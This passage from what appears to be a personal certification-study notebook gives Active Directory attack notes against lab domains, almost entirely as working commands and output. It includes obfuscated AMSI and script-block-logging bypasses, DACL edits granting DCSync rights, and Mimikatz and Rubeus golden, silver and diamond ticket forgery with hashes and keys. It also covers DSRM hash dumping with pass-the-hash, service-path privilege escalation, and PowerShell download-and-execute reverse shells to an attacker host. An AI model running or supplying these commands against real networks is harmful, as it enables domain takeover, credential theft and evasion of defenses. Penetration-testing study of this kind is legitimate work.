C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1\n```\n\nUse the below command to enumerate all the domains in the current forest:\n\n\n```\n(Get-ADForest).Domains\n```\n\nPS C:\\AD\\Tools>**(Get-ADForest).Domains    ** \ndollarcorp.moneycorp.local\nmoneycorp.local\nus.dollarcorp.moneycorp.local\n\nTo map all the trusts in the current domain, we can use the below command:\n\n\n```\nGet-ADTrust -Filter * \n```\n\n```\nPS C:\\AD\\Tools>**Get-ADTrust -Filter *    ** \nDirection : BiDirectional\nDisallowTransivity : False\nDistinguishedName :\nCN=moneycorp.local,CN=System,DC=dollarcorp,DC=moneycorp,DC=local\nForestTransitive : False\nIntraForest : True\nIsTreeParent : False\nIsTreeRoot : False\n**Name : moneycorp.local**\nObjectClass : trustedDomain\nObjectGUID : 01c3b68d-520b-44d8-8e7f-4c10927c2b98\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\nSource : DC=dollarcorp,DC=moneycorp,DC=local\nTarget : moneycorp.local\nTGTDelegation : False\nTrustAttributes : 32\nTrustedPolicy :\nTrustingPolicy :\nTrustType : Uplevel\nUplevelOnly : False\nUsesAESKeys : False\nUsesRC4Encryption : False\n[snip]\n```\n\nTo list all the trusts in the moneycorp.local forest:\n\n\n```\nGet-ADForest | %{Get-ADTrust -Filter *} \n```\n\n```\nPS C:\\AD\\Tools>**Get-ADForest | %{Get-ADTrust -Filter *}    ** \n**Direction : BiDirectional**\nDisallowTransivity : False\nDistinguishedName :\nCN=moneycorp.local,CN=System,DC=dollarcorp,DC=moneycorp,DC=local\nForestTransitive : False\nIntraForest : True\nIsTreeParent : False\nIsTreeRoot : False\nName : moneycorp.local\nObjectClass : trustedDomain\nObjectGUID : 01c3b68d-520b-44d8-8e7f-4c10927c2b98\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\n**Source : DC=dollarcorp,DC=moneycorp,DC=local**\n**Target : moneycorp.local**\nTGTDelegation : False\nTrustAttributes : 32\nTrustedPolicy :\nTrustingPolicy :\nTrustType : Uplevel\nUplevelOnly : False\nUsesAESKeys : False\nUsesRC4Encryption : False\n[snip]\n```\n\nTo list only the external trusts in moneycorp.local domain:\n\n\n\n```\n(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} \n```\n\n```\nPS C:\\AD\\Tools>**(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}    ** \nDirection : BiDirectional\nDisallowTransivity : False\nDistinguishedName :\nCN=eurocorp.local,CN=System,DC=dollarcorp,DC=moneycorp,DC=local\n**ForestTransitive : False**\n**IntraForest : False**\nIsTreeParent : False\nIsTreeRoot : False\nName : eurocorp.local\nObjectClass : trustedDomain\nObjectGUID : d4d64a77-63be-4d77-93c2-6524e73d306d\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : True\n**Source : DC=dollarcorp,DC=moneycorp,DC=local**\n**Target : eurocorp.local**\nTGTDelegation : False\nTrustAttributes : 4\nTrustedPolicy :\nTrustingPolicy :\nTrustType : Uplevel\nUplevelOnly : False\nUsesAESKeys : False\nUsesRC4Encryption : False\t\n```\n\nFinally, to identify external trusts of the dollarcorp domain, we can use the below command. The output is same as above because there is just one external trust in the entire forest. Otherwise, output of the aboce command would be different than the below one:\n\n\n\n```\nGet-ADTrust -Filter '(intraForest -ne $True) -and(ForestTransitive -ne $True)' \n```\n\n```\nPS C:\\AD\\Tools>**Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'    ** \nDirection : BiDirectional\nDisallowTransivity : False\nDistinguishedName :\nCN=eurocorp.local,CN=System,DC=dollarcorp,DC=moneycorp,DC=local\n**ForestTransitive : False**\n**IntraForest : False**\nIsTreeParent : False\nIsTreeRoot : False\nName : eurocorp.local\nObjectClass : trustedDomain\nObjectGUID : d4d64a77-63be-4d77-93c2-6524e73d306d\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : True\n**Source : DC=dollarcorp,DC=moneycorp,DC=local**\n**Target : eurocorp.local**\nTGTDelegation : False\nTrustAttributes : 4\nTrustedPolicy :\nTrustingPolicy :\nTrustType : Uplevel\nUplevelOnly : False\nUsesAESKeys : False\nUsesRC4Encryption : False\n```\n\nBecause we have trust relationship with eurocorp.local, we can enumerate trusts for it:\n\n\n\n```\nGet-ADTrust -Filter * -Server eurocorp.local\n```\n\n```\nPS C:\\AD\\Tools>**Get-ADTrust -Filter * -Server eurocorp.local    ** \nDirection : BiDirectional\nDisallowTransivity : False\nDistinguishedName : CN=eu.eurocorp.local,CN=System,DC=eurocorp,DC=local\nForestTransitive : False\n**IntraForest : True**\nIsTreeParent : False\nIsTreeRoot : False\nName : eu.eurocorp.local\nObjectClass : trustedDomain\nObjectGUID : bfc7a899-cc5d-4303-8176-3b8381189fae\nSelectiveAuthentication : False\nSIDFilteringForestAware : False\nSIDFilteringQuarantined : False\n**Source : DC=eurocorp,DC=local**\n**Target : eu.eurocorp.local**\nTGTDelegation : False\nTrustAttributes : 32\nTrustedPolicy :\nTrustingPolicy :\nTrustType : Uplevel\nUplevelOnly : False\nUsesAESKeys : False\nUsesRC4Encryption : False\n[snip]\n```\n\n\n## Generic All\n\n```\n╭─kali@kali ~/Desktop/CPTS \n╰─$ dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'svc_trilocorsync' -target-dn 'CN=DC01,OU=DOMAIN CONTROLLERS,DC=TRILOCOR,DC=LOCAL' trilocor.local/svc_trilocorsync:Synchronicity_21 -dc-ip 172.16.139.3\nImpacket v0.12.0.dev1+20240509.95404.2a65d8d - Copyright 2023 Fortra\n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20240610-091055.bak\n[*] DACL modified successfully!\n```\n\n## DCsync\n\n```\n╭─kali@kali ~/Desktop/CPTS \n╰─$ dacledit.py -action 'write' -rights 'DCSync' -inheritance -principal 'svc_trilocorsync' -target-dn 'CN=DC01,OU=DOMAIN CONTROLLERS,DC=TRILOCOR,DC=LOCAL' trilocor.local/svc_trilocorsync:Synchronicity_21 -dc-ip 172.16.139.3        130 ↵\nImpacket v0.12.0.dev1+20240509.95404.2a65d8d - Copyright 2023 Fortra\n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20240610-092240.bak\n[*] DACL modified successfully\n```\n\n\n```\nPowermad.ps1\n\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/02-Presistance/08-DSRM (The Directory Services Restore Mode)",
    "path": "02-CRTP/02-Presistance/08-DSRM (The Directory Services Restore Mode).md",
    "title": "08 DSRM (The Directory Services Restore Mode)",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` C:\\AD\\Tools>ArgSplit.bat [!] Argument Limit: 180 characters [+] Enter a string: diamond set \"z=d\" set \"y=n\" set \"x=o\" set \"w=m\" set \"v=a\" set \"u=i\" set \"t=d\" set \"Pwn=%t%%u%%v%%w%%x%%y%%z%\" ` ` C:\\A...",
    "category": "02-CRTP",
    "content": "\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: diamond\nset \"z=d\"\nset \"y=n\"\nset \"x=o\"\nset \"w=m\"\nset \"v=a\"\nset \"u=i\"\nset \"t=d\"\nset \"Pwn=%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools\\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt \n```\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n```\n$sess = New-PSSession dcorp-dc  \n```\n\n```\nEnter-PSSession -Session $sess  \n```\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n```\nexit \n```\n\nLoad the Invoke-Mimi script in the session, Run the below command on local machine:\n\n```\nInvoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $sess\n```\n\nWe will extract the credentials from the SAM file from the DC. The Directory Services Restore Mode (DSRM) password is mapped to the local Administrator on the DC:\n\n```\nEnter-PSSession -Session $sess\n```\n\n```\nInvoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'\n```\n\n![](https://i.imgur.com/ONujIBL.jpeg)\n\n\nThe DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC. We can do this as follows:\n\n```\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD\n```\n\nNow from our local system we can just pass the hash for the DSRM administrator:\n\n```\nInvoke-Mimi -Command '\"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\"'\n```\n\n![](https://i.imgur.com/siQdyOI.png)\n\nWe can now access the dcorp-dc directly from the new session.\n\n```\nls \\\\dcorp-dc.dollarcorp.moneycorp.local\\c$\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/02-Presistance/09-Golden-ticket",
    "path": "02-CRTP/02-Presistance/09-Golden-ticket.md",
    "title": "09 Golden Ticket",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Krbtgt using Mimikatz for Golden Ticket  `  . C:\\AD\\Tools\\Invoke-Mimi.ps1 ` ` Invoke-Mimi -Command '\"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-372...",
    "category": "02-CRTP",
    "content": "# Krbtgt using Mimikatz for Golden Ticket \n\n```\n . C:\\AD\\Tools\\Invoke-Mimi.ps1\n```\n\n```\nInvoke-Mimi -Command '\"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n```\n\n\n![](https://i.imgur.com/Z07ddpQ.jpeg)\n\n```\n ls \\\\dcorp-dc\\c$\n```\n\n![](https://i.imgur.com/jNuzAXz.png)\n\nattacking dir \n\n```\nPS C:\\> net use O: \\\\dcorp-dc\\c$\n```\n\n```\nPS C:\\> net use O: \\\\dcorp-dc\\c$\nSystem error 85 has occurred.\n\nThe local device name is already in use.\n\nPS C:\\> O:\nPS O:\\> dir\n\n\n    Directory: O:\\\n\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          5/8/2021   1:20 AM                PerfLogs\nd-r---        11/14/2022  10:12 PM                Program Files\nd-----          5/8/2021   2:40 AM                Program Files (x86)\nd-r---         4/28/2024   1:47 AM                Users\nd-----         1/10/2024  12:59 AM                Windows\n\n\nPS O:\\>\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/02-Presistance/10-silver ticket",
    "path": "02-CRTP/02-Presistance/10-silver ticket.md",
    "title": "10 Silver Ticket",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "From Hacktricks ` mimikatz.exe \"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:4e9815869d2090ccfca61c1fe0d23986 /user:administrator /service:CIF...",
    "category": "02-CRTP",
    "content": "##  From Hacktricks\n\n```\nmimikatz.exe \"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:4e9815869d2090ccfca61c1fe0d23986 /user:administrator /service:CIFS /target:dcorp-dc.dollarcorp.moneycorp.local /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"\n```\n\n- for CIFS \n\n```\nInvoke-Mimi -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:4e9815869d2090ccfca61c1fe0d23986 /user:administrator /service:CIFS /target:dcorp-dc.dollarcorp.moneycorp.local /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n```\n\n- For HTTP\n\n```\nInvoke-Mimi -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:4e9815869d2090ccfca61c1fe0d23986 /user:administrator /service:http /target:dcorp-dc.dollarcorp.moneycorp.local /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n```\n\n\n--------------- \n## From Module Using Rubeus\n\n```\nPS C:\\Users\\student222> cd C:\\AD\\Tools\\\nPS C:\\AD\\Tools> .\\ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: silver\nset \"z= \"\nset \"y=r\"\nset \"x=e\"\nset \"w=v\"\nset \"v=l\"\nset \"u=i\"\nset \"t=s\"\nset \"Pwn=%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:4e9815869d2090ccfca61c1fe0d23986 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt\n```\n\n\n```\nwinrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd\n```\n\n\n--------------\n\n## Using Bettersaftykatz \n\n```\nC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:c6a60b67476b36ad7838d7875c33c2c3 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"\n```\n\n```\nC:\\AD\\Tools\\SafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:c6a60b67476b36ad7838d7875c33c2c3 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"\n```\n\nInject a ticket for RPCSS:\n\n```\nC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:c6a60b67476b36ad7838d7875c33c2c3 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/02-Presistance/11-Diamond Ticket",
    "path": "02-CRTP/02-Presistance/11-Diamond Ticket.md",
    "title": "11 Diamond Ticket",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "` C:\\AD\\Tools>ArgSplit.bat [!] Argument Limit: 180 characters [+] Enter a string: diamond set \"z=d\" set \"y=n\" set \"x=o\" set \"w=m\" set \"v=a\" set \"u=i\" set \"t=d\" set \"Pwn=%t%%u%%v%%w%%x%%y%%z%\" ` ` C:\\A...",
    "category": "02-CRTP",
    "content": "\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: diamond\nset \"z=d\"\nset \"y=n\"\nset \"x=o\"\nset \"w=m\"\nset \"v=a\"\nset \"u=i\"\nset \"t=d\"\nset \"Pwn=%t%%u%%v%%w%%x%%y%%z%\"\n```\n\n```\nC:\\AD\\Tools\\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt \n```\n\n```\nwinrs -r:dcorp-dc cmd\n```\n\n\n### Login Using Powershell Remoting \n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\n$sess = New-PSSession dcorp-dc  \n```\n\n```\nEnter-PSSession -Session $sess  \n```\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\n\n## Dump from Directory Services Restore Mode\n\n```\nPS C:\\AD\\Tools> Invoke-Command -FilePath C:\\AD\\Tools\\Invoke-Mimi.ps1 -Session $sess\n>>\nPS C:\\AD\\Tools> Enter-PSSession -Session $sess\n[dcorp-dc]: PS C:\\Users\\Administrator\\Documents> Invoke-Mimi -Command '\"token::elevate\" \"lsadump::sam\"'\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/02-Unquoted Service Paths",
    "path": "02-CRTP/02-Unquoted Service Paths.md",
    "title": "02 Unquoted Service Paths",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Various ways of privesc - missing patches - Automated deployment and Autologin passwords in clear text - AlwaysInstallElevated (any user can run MSI as SYSTEM) - Misconfigured services - DLL Hijacking...",
    "category": "02-CRTP",
    "content": "## Various ways of privesc\n- missing patches\n- Automated deployment and Autologin passwords in clear text\n- AlwaysInstallElevated (any user can run MSI as SYSTEM)\n- Misconfigured services\n- DLL Hijacking and more\n- NTLM relaying, a.k.a Won't Fix\n- Unquoted service path (services)\n## Tools \n\n- Powerup - invok-allchecks\n- Privesc  - invoke-prices\n- winPEAS\n\n- check permission in the group \n\n```\nnet localgroup Administrators\n```\n\n- delete local administrator\n\n```\nnet localgroup Administrators dcorp\\student222 /delete\n```\n\n- check which user\n\n```\nnet user\n```\n\n\n## Unquoted Service Paths\n\n[Unquoted Service Paths Manuel method](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)\n\n[Windows Privilege Escalation: Unquoted Service Path](https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/)\n\n [Powersploit](https://ed4m4s.blog/privilege-escalation/windows/unquoted-service-path)\n\nWe can use the Powerup from PowerSploit module to check for any privilege escalation path. Feel free to use other tools mentioned in the class like WinPEAS.\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\n. C:\\AD\\Tools\\PowerUp.ps1\n```\n\n```\nInvoke-AllChecks\n```\n\n```\n Get-ServiceUnquoted\n```\n\n![](https://i.imgur.com/cSWcCVy.png)\n\n\nExploiting service using  powerup \n\n```\nInvoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\\student222' -Verbose\n```\n\n## manual method\n\n- finding unquoted service without using powerview \n\n```\nwmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\n```\n\n\n```\nGet-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne \"Disabled\" -and $_.StartName -eq \"LocalSystem\" -and $_.PathName -notmatch \"`\"\" -and $_.PathName -notmatch \"C:\\\\Windows\"} | Format-List\n```\n\n![](https://i.imgur.com/ya6fy3w.png)\n\nLet's use the abuse function for Invoke-ServiceAbuse and add our current domain user to the local Administrators group.\n\n```\nsc config <Service_Name> binpath= \"net localgroup administrators username /add\"\n```\n\n\n### Creating service using msf\n\n\n```\nmsfvenom -p windows/exec CMD=\"net localgroup administrators dcorp/student222 /add\" -f exe-service -o service.exe\n```\n\n\n```\nWrite-ServiceBinary -name \"AbyssWebServer\" -Path \"c:\\WINDOWS\\System32\\cmd.exe /c net localgroup administrators dcrop/student222 /add\"\n```\n\n### [Modify service binary path](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths)\n\nchecking permission \n\n\n![](https://i.imgur.com/U8IVo6l.png)\n\n\nIn the scenario where the \"Authenticated users\" group possesses **SERVICE_ALL_ACCESS** on a service, modification of the service's executable binary is possible. To modify and execute **sc**:\n\n\n\n```\nsc config <Service_Name> binpath= \"net localgroup administrators username /add\"\n```\n\n## Restart service\n\n```\nwmic service NAMEOFSERVICE call startservice\nnet stop [service name] && net start [service name]\n```\n\n\n\n\n## local administrative access \n\n We can see that the dcorp\\\\student222 is a local administrator now. Just logoff and logon again and we have local administrator privileges!\n\nNow for the next task, to identify a machine in the domain where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\n. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1\n```\n\n```\nFind-PSRemotingLocalAdminAccess\n```\n\n\nSo, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:\n\n\n```\nwinrs -r:dcorp-adminsrv cmd \n```\n\n```\nset username \n```\n\n\n```\nset computername \n```\n\nWe can also use PowerShell Remoting:\n\n```\nEnter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local\n```\n\n\n```\n$env:username\n```\n\n\n## Exploit Jenkins\n\nTo be able to execute commands on Jenkins server without admin access we must have privileges to Configure builds. We have a misocnfigured Jenkins instance on dcorp-ci (http://172.16.3.11:8080). If we go to the \"people\" page of Jenkins we can see the users present on the Jenkins instance. Remember to use Edge to open the Jenkins web console!\n\n#### powershell rev shell \n\n```\npowershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443\n```\n\nor\n\n```\npowershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443\n```\n\n\nOn the student VM, run a netcat or powercat listener which listens on the port which we used above (443):\n\n#### Netcat listner\n\n```\nC:\\AD\\Tools\\netcat-win32-1.12\\nc64.exe -lvp 443\n```\n\n\n```\npowercat -l -p 443 -v\n```\n\nWe can now run commands on the reverse shell:\n\n```\n$env:username\n```\n\n\n```\nipconfig\n```\n\n\n```\n$env:computername\n```\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/03- Remoting Local Admin Access",
    "path": "02-CRTP/03- Remoting Local Admin Access.md",
    "title": "03  Remoting Local Admin Access",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "We can see that the dcorp\\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges! Now for the next task, to identify a machine in the domain wher...",
    "category": "02-CRTP",
    "content": "We can see that the dcorp\\studentx is a local administrator now. Just logoff and logon again and we have local administrator privileges!\n\nNow for the next task, to identify a machine in the domain where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1:\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n\n```\n. C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1\n```\n\n```\nFind-PSRemotingLocalAdminAccess\n```\n\n![](https://i.imgur.com/FyUBuAQ.png)\n\n\n\nSo, studentx has administrative access on dcorp-adminsrv and on the student machine. We can connect to dcorp-adminsrv using winrs as the student user:\n\n```\nwinrs -r:dcorp-adminsrv cmd \n```\n\n![](https://i.imgur.com/UTf5w8h.png)\n\n\n-------------------\n### using PowerShell Remoting\n\n```\nEnter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local\n```\n\n![](https://i.imgur.com/97kTAxC.png)\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/04-Jenkins Exploit",
    "path": "02-CRTP/04-Jenkins Exploit.md",
    "title": "04 Jenkins Exploit",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Reverse shell ` powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.222/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.222 -Port 443 ` Or ` powershell...",
    "category": "02-CRTP",
    "content": "### Reverse shell\n\n```\npowershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.222/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.222 -Port 443\n```\n\nOr\n\n```\npowershell.exe iex (iwr http://172.16.100.222/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.222 -Port 443\n```\n\n```\nC:\\AD\\Tools\\netcat-win32-1.12\\nc64.exe -lvp 443\n```\n\n\n![](https://i.imgur.com/w5UIPHU.png)\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/05-Domain User Location & extract credentials",
    "path": "02-CRTP/05-Domain User Location & extract credentials.md",
    "title": "05 Domain User Location & Extract Credentials",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the downloa...",
    "category": "02-CRTP",
    "content": "bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts. Note that we could also paste the contents of sbloggingbypass.txt in place of the download-exec cradle. Remember to host the sbloggingbypass.txt on a web server on the student VM if you use the download-exec cradle :\n\n```\niex (iwr http://172.16.100.222/sbloggingbypass.txt -UseBasicParsing)\n```\n\n\nUse the below command to bypass AMSI:\n\n```\nS`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  \"{1}{0}\"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  ).\"A`ss`Embly\".\"GET`TY`Pe\"((  \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) ).\"g`etf`iElD\"(  ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  )).\"sE`T`VaLUE\"(  ${n`ULl},${t`RuE} )\n```\n\nNow, download and execute PowerView in memory of the reverse shell and run FindDomainUserLocation. Note that, Find-DomainUserLocation may take many minutes to check all the machines in the domain:\n\n```\niex ((New-Object Net.WebClient).DownloadString('http://172.16.100.222/PowerView.ps1'))\n```\n\n```\nFind-DomainUserLocation\n```\n\n![](https://i.imgur.com/bA7pf59.png)\n\n\n![](https://i.imgur.com/35f09cw.png)\n\n## We would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it\n\nWe would now run SafetyKatz.exe on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.\n\nRun the following command on the reverse shell:\n\n```\niwr http://172.16.100.222/Loader.exe -OutFile C:\\Users\\Public\\Loader.exe\n```\n\n```\necho F | xcopy C:\\Users\\Public\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exe\n```\n\n\nUsing winrs, add the following port forwarding on dcorp-mgmt to avoid detection on 